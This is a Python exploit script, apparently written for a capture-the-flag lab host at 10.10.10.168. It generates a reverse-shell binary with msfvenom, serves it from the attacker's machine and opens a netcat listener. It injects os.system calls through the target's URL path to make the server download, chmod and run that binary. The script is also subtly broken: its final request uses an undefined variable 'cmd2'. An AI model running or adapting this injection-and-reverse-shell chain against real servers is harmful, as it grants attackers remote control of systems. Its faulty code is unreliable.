from requests import get
import os, sys, threading

def servidor():
    os.system("python -m SimpleHTTPServer 80")
    
def escuchar():
    global LPORT
    os.system("nc -nvlp "+str(LPORT))

def main():    
    global LPORT
    LHOST,LPORT = sys.argv[1] ,  sys.argv[2]
    os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" -f elf -o crack.elf")
    servidorPython = threading.Thread(target=servidor)
    servidorPython.start()
    
    escucha = threading.Thread(target=escuchar)
    escucha.start()
    
    target = "http://10.10.10.168:8080/"
    
    cmd = "wget http://"+LHOST+"/crack.elf -O /tmp/crack.elf"
    get(target + "';path='/';os.system("+"'"+cmd+"'"+");"+"'")
    os.system("rm -r crack.elf")
    
    cmd = "chmod +x /tmp/crack.elf"
    get(target + "';path='/';os.system("+"'"+cmd+"'"+");"+"'")
    cmd = "/tmp/crack.elf"
    get(target + "';path='/';os.system("+"'"+cmd2+"'"+");"+"'")
    

if __name__ == '__main__':
    main()
    
    
